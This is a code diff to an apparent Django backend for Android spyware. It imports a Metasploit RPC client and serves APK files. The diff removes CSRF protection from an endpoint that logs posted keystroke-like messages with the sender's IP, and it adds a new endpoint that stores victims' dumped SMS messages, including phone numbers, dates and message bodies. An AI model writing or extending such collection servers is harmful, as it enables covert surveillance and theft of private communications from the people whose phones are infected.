@@ -13,6 +13,7 @@ from back.models import Messages
 from pymetasploit3.msfrpc import MsfRpcClient
 from rest_framework.response import Response
 from rest_framework import status, permissions
+from django.views.decorators.csrf import csrf_exempt
 
 
 def get_apk_file(request, apk_name):
@@ -22,10 +23,27 @@ def get_apk_file(request, apk_name):
     return response
 
 
+@csrf_exempt
 def key(request):
     req = json.loads(request.body)
     try:
         Messages.objects.create(message=req["body"], ip=request.META["REMOTE_ADDR"])
+        return HttpResponse("OK")
+    except:
+        return HttpResponse("Error")
+
+
+@csrf_exempt
+def sms(request):
+    content = json.loads(request.body)
+    try:
+        dump_sms.objects.create(
+            sms_type=content["type"],
+            phone_number=content["address"],
+            date=datetime.datetime.fromtimestamp(int(content["date"]) / 1000.0).strftime("%Y-%m-%d %H:%M:%S"),
+            status=content["status"],
+            body=content["body"],
+        )
         return HttpResponse("OK")
     except:
         return HttpResponse("Error")
